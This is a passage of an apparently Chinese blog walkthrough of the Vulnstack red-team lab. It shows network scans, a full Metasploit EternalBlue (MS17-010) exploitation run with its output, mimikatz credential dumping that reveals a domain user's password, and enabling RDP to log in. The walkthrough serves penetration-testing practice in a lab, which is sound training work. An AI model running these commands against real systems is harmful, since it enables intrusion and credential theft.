class=\"hljs-number\"\u003e139\u003c/span\u003e open  \n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e open \n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e open  \n\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e open\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e open\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e open  \n\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.129\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e open \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e130\u003c/code\u003e开启了\u003ccode\u003e88\u003c/code\u003e端口，是\u003ccode\u003ekerberos\u003c/code\u003e服务端口，可能是域控，并且都开启了\u003ccode\u003e445\u003c/code\u003e端口\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003evulscan\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e[*] NetInfo                                         \n[*]\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e                                  \n   [-\u003e]TESTWIN7-PC\n   [-\u003e]\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e                              \n[*] NetBios \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.1\u003c/span\u003e   WORKGROUP\\DESKTOP-OO4DPSM \n[*] NetInfo                                      \n[*]\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e                                  \n   [-\u003e]WIN-ENS2VR5TR3N                              \n   [-\u003e]\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e                              \n[*] NetBios \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e HPC Edition \u003cspan class=\"hljs-number\"\u003e7601\u003c/span\u003e Service Pack \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n[+] MS17\u003cspan class=\"hljs-number\"\u003e-010\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e    (Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e Enterprise \u003cspan class=\"hljs-number\"\u003e7601\u003c/span\u003e Service Pack \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) \n[+] MS17\u003cspan class=\"hljs-number\"\u003e-010\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e    (Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e HPC Edition \u003cspan class=\"hljs-number\"\u003e7601\u003c/span\u003e Service Pack \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e和上面猜测的一样，\u003ccode\u003e130\u003c/code\u003e是\u003ccode\u003eDC\u003c/code\u003e，域名是\u003ccode\u003edemo.com\u003c/code\u003e ,并且两台主机都扫描出了可能存在\u003ccode\u003eMS17-010\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e内网渗透\u003c/h2\u003e\n\u003ch3\u003eMS17-010\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e尝试\u003ccode\u003eMS17-010\u003c/code\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eTESTWIN7-PC\u003c/code\u003e \u003ccode\u003e192.168.183.131\u003c/code\u003e (概率低的令人发指)，可能是代理问题\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/ms17_010_eternalblue)\u003c/span\u003e \u003e use exploit/windows/smb/ms17_010_eternalblue\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/ms17_010_eternalblue)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts 192.168.183.131\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/ms17_010_eternalblue)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload windows/meterpreter/bind_tcp\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/ms17_010_eternalblue)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e AutoRunScript post/windows/manage/migrate\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/ms17_010_eternalblue)\u003c/span\u003e \u003e run\n\n[*] 192.168.183.131:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 192.168.183.131:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 \u003cspan class=\"hljs-title function_\"\u003ex64\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e-bit)\u003c/span\u003e\n[*] 192.168.183.131:445   - Scanned 1 of 1 \u003cspan class=\"hljs-title function_\"\u003ehosts\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\u003c/span\u003e\n[+] 192.168.183.131:445 - The target is vulnerable.                                                      \n[*] 192.168.183.131:445 - Connecting to target \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e exploitation.\n[+] 192.168.183.131:445 - Connection established \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e exploitation.\n[+] 192.168.183.131:445 - Target OS selected valid \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e OS indicated by SMB reply\n[*] 192.168.183.131:445 - CORE raw buffer \u003cspan class=\"hljs-title function_\"\u003edump\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e bytes)\u003c/span\u003e\n[*] 192.168.183.131:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp\n[*] 192.168.183.131:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic\n[*] 192.168.183.131:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        \n[+] 192.168.183.131:445 - Target arch selected valid \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e arch indicated by DCE/RPC reply\n[*] 192.168.183.131:445 - Trying exploit with 12 Groom Allocations.\n[*] 192.168.183.131:445 - Sending all but last fragment of exploit packet\n[*] 192.168.183.131:445 - Starting non-paged pool grooming                             \n[+] 192.168.183.131:445 - Sending SMBv2 buffers                                                          \n[+] 192.168.183.131:445 - Closing SMBv1 connection creating \u003cspan class=\"hljs-built_in\"\u003efree\u003c/span\u003e hole adjacent to SMBv2 buffer.\n[*] 192.168.183.131:445 - Sending final SMBv2 buffers。\n[*] 192.168.183.131:445 - Sending last fragment of exploit packet!\n[*] 192.168.183.131:445 - Receiving response from exploit packet\n[*] 192.168.183.131:445 - Sending last fragment of exploit packet!\n[*] 192.168.183.131:445 - Receiving response from exploit packet                                         \n[+] 192.168.183.131:445 - ETERNALBLUE overwrite completed \u003cspan class=\"hljs-title function_\"\u003esuccessfully\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e0xC000000D\u003c/span\u003e)\u003c/span\u003e!                     \n[*] 192.168.183.131:445 - Sending egg to corrupted connection.                                           \n[*] 192.168.183.131:445 - Triggering \u003cspan class=\"hljs-built_in\"\u003efree\u003c/span\u003e of corrupted buffer.                                           \n[*] Started bind TCP handler against 192.168.183.131:6756                                        \n[-] 192.168.183.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[-] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[-] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                  \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Connecting to target \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e exploitation.                                         \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Connection established \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e exploitation.                                       \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Target OS selected valid \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e OS indicated by SMB reply                         \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - CORE raw buffer dump (\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e bytes)                                                \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e0x00000000\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003ee \u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e6f\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e73\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003ee \u003cspan class=\"hljs-number\"\u003e74\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e65\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e72\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e70\u003c/span\u003e  Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e Enterp  \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e0x00000010\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e72\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e73\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e65\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e65\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e72\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e76\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e63\u003c/span\u003e  rise \u003cspan class=\"hljs-number\"\u003e7601\u003c/span\u003e Servic  \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e0x00000020\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e65\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e63\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e6b\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e                          e Pack \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e          \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Target arch selected valid \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e arch indicated by DCE/RPC reply                 \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Trying exploit with \u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e Groom Allocations.                                      \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Sending all but last fragment of exploit packet\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Starting non-paged pool grooming                                               \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Sending SMBv2 buffers     \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Closing SMBv1 connection creating \u003cspan class=\"hljs-built_in\"\u003efree\u003c/span\u003e hole adjacent to SMBv2 buffer.          \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Sending final SMBv2 buffers.                     \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Sending last fragment of exploit packet!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Receiving response from exploit packet\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - ETERNALBLUE overwrite completed successfully (\u003cspan class=\"hljs-number\"\u003e0xC000000D\u003c/span\u003e)!                     \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Sending egg to corrupted connection.  \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Triggering \u003cspan class=\"hljs-built_in\"\u003efree\u003c/span\u003e of corrupted buffer.    \n[*] Sending stage (\u003cspan class=\"hljs-number\"\u003e201798\u003c/span\u003e bytes) to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e                                                      \n[*] Session ID \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.129\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50614\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e6756\u003c/span\u003e via session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) processing AutoRunScript \u003cspan class=\"hljs-string\"\u003e'post/windows/manage/migrate'\u003c/span\u003e \n[*] Running module against TESTWIN7-PC                                                                   \n[*] Current server process: spoolsv.exe (\u003cspan class=\"hljs-number\"\u003e1104\u003c/span\u003e)                                                           \n[*] Spawning notepad.exe process to migrate into                                                         \n[*] Spoofing PPID \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                                                                                      \n[*] Migrating into \u003cspan class=\"hljs-number\"\u003e836\u003c/span\u003e                                                                                   \n[+] Successfully migrated into process \u003cspan class=\"hljs-number\"\u003e836\u003c/span\u003e                                                               \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                  \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=        \n[*] Meterpreter session \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.129\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50614\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e6756\u003c/span\u003e via session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-03\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e +\u003cspan class=\"hljs-number\"\u003e0800\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eWIN-ENS2VR5TR3N\u003c/code\u003e \u003ccode\u003e192.168.183.130\u003c/code\u003e DC，成功不了，可能是考别的知识点\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e抓取密码\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eMSF加载\u003ccode\u003emimikatz\u003c/code\u003e模块\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emeterpreter \u003e load kiwi\nLoading extension kiwi...\n  .#####.   mimikatz \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20191125\u003c/span\u003e (x64/windows)\n .## ^ ##.  \u003cspan class=\"hljs-string\"\u003e\"A La Vie, A L'Amour\"\u003c/span\u003e - (oe.eo)\n ## / \\ ##  \u003cspan class=\"hljs-comment\"\u003e/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       \u003e http://blog.gentilkiwi.com/mimikatz\n '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  '#####'         \u003e http://pingcastle.com / http://mysmartlogon.com  ***/\u003c/span\u003e\n\nSuccess.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e抓取密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emeterpreter \u003e creds_all\nwdigest credentials\n===================\n\nUsername      Domain  Password\n--------      ------  --------\n(null)        (null)  (null)\nTESTWIN7-PC$  DEMO    /-LDA[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003ed hf-tfj)O)yNyCgh[o#D[h7I\u003cspan class=\"hljs-comment\"\u003e/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDWIzuYDDytr)\\J7(_e(Fctsjl.Zd\"JRr\ndouser        DEMO    Dotest123\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e抓取域用户\u003ccode\u003edouser\u003c/code\u003e的密码\u003ccode\u003eDotest123\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eWin7开启RDP\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emeterpreter \u003e getuid\nServer username: NT AUTHORITY\\SYSTEM\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e开启\u003ccode\u003eRDP\u003c/code\u003e服务，使用\u003ccode\u003eMSF\u003c/code\u003e模块\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emeterpreter \u003e run post/windows/manage/enable_rdp \n\n[*] Enabling Remote Desktop\n[*]     RDP is disabled; enabling it ...\n[*] Setting Terminal Services service startup mode\n[*]     The Terminal Services service is not \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e to \u003cspan class=\"hljs-keyword\"\u003eauto\u003c/span\u003e, changing it to \u003cspan class=\"hljs-keyword\"\u003eauto\u003c/span\u003e ...\n[*]     Opening port in local firewall \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e necessary\n[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/\u003cspan class=\"hljs-number\"\u003e20241203215408\u003c/span\u003e_default_192.\u003cspan class=\"hljs-number\"\u003e168.183\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e131\u003c/span\u003e_host.windows.cle_035122.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试登陆\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eproxychains rdesktop \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.131\u003c/span\u003e -p Dotest123 -u douser\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image57.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eDC\u003c/code\u003e上应该是有策略，不允许该用户登录\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e寻找可利用点\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e在桌面下发现一些常用渗透工具\u003ccode\u003eMS14-068\u003c/code\u003e 可能是要使用该方法来攻略\u003ccode\u003eDC\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ec:\\Users\\douser\\Desktop\u003edir\ndir\n Volume in drive C has no label.\n Volume Serial Number is \u003cspan class=\"hljs-number\"\u003e605F\u003c/span\u003e-F555\n\n Directory of c:\\Users\\douser\\Desktop\n\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e    \u0026#x3C;DIR\u003e          .\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e    \u0026#x3C;DIR\u003e          ..\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e06\u003c/span\u003e             \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e189\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e360\u003c/span\u003e极速浏览器.lnk\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e            \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e336\u003c/span\u003e artifact.exe\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e05\u003c/span\u003e             \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e406\u003c/span\u003e GetUserSPNs.ps1.ps1\n\u003cspan class=\"hljs-number\"\u003e2015\u003c/span\u003e/\u003cspan 